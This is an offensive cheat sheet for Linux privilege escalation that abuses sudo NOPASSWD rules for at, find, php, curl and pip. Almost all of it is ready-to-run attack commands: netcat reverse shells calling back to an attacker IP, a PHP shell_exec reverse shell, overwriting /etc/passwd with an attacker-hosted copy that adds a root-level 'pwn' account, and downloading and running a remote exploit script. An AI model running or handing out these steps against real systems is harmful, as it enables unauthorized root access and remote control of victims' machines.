# Linux Privilege Escalation

## 1. /usr/bin/at

```
(root) NOPASSWD: /usr/bin/at
```
  **Attacker's machine** 
  
  - start listner on port 4444 using netcat 
  ```
  nc -nvlp 444
  ```
  
  **Victim's machine** 
  
  - create a bash script which contain this command 
  ```
  nc 192.168.0.106 4444 -e /bin/bash
  ``` 
  - run this command and wait for one minute
  ```
  sudo at -f exp.sh now + 1 minutes
  ```
  
## 2. /usr/bin/find

```
(root) NOPASSWD: /usr/bin/find
```
  **Victim's machine**
  
  - create a bash file using 
  ```
  echo "/bin/bash" > find.sh
  ```
  - pop root shell with this command
  ```
  sudo find /etc/passwd -type f -name "passwd" -exec bash find.sh "{}" \;
  ```
  
## 3. /usr/bin/php

```
root) NOPASSWD: /usr/bin/php
```
  **Attacker's machine**
  
  - start listner on port 1234 using netcat 
  ```
  nc -nvlp 1234
  ```
  
  **Victim's machine**
  
  - run this command and replace <IP> with your IP 
 ```
 echo "<?php shell_exec('nc <IP> 1234 -e /bin/sh');?>" > shell.php
 ```
  - pop up root shell
 ```
 sudo php shell.php
 ```

## 4. /usr/bin/curl

```
root) NOPASSWD: /usr/bin/curl
```

  **Attacker's machine**
  
  - Copy /etc/passwd from victim's machine and save it on attacker's machine as pass.txt
  - add this line at this end of the file 
  ```
  pwn:$1$pwn$AxNbnbaujRUXRur/DewJ8/:0:0:/root/root:/bin/bash
  ```
  - start http server using python and note the IP
  ```python -m SimpleHTTPServer 8080
  ```
  
  
  **Victim's machine**
  
  - run this command ( replace <IP> with your IP) 
 ```
 sudo curl http://<IP>:8080/pass.txt -o /etc/passwd
 ```
  - change user to **pwn** using password **pwn** 
 ```
 su pwn
 ```
 
## 5. /usr/bin/pip3 OR /usr/bin/pip

```
(root) NOPASSWD: /usr/bin/pip3
```
 **Attacker's machine**
 
 - start listner on port 4444 using netcat 
 ```
 nc -nvlp 4444
 ```
 
 **Victim's machine**
 
 - Download our modified exploit using curl 
 ```javascript 
 curl https://raw.githubusercontent.com/theamanrawat/privilege-escalation/master/Linux/pip_exp.py?token=AISTJLQB7CDRPQS3OWODDE27E23S2 -o exploit.py
 ```
 - run this exploit(replace <IP> with attacker's IP) and wait few seconds
 ```python3 exploit.py <IP> 4444 /usr/bin/pip3
 ```
  
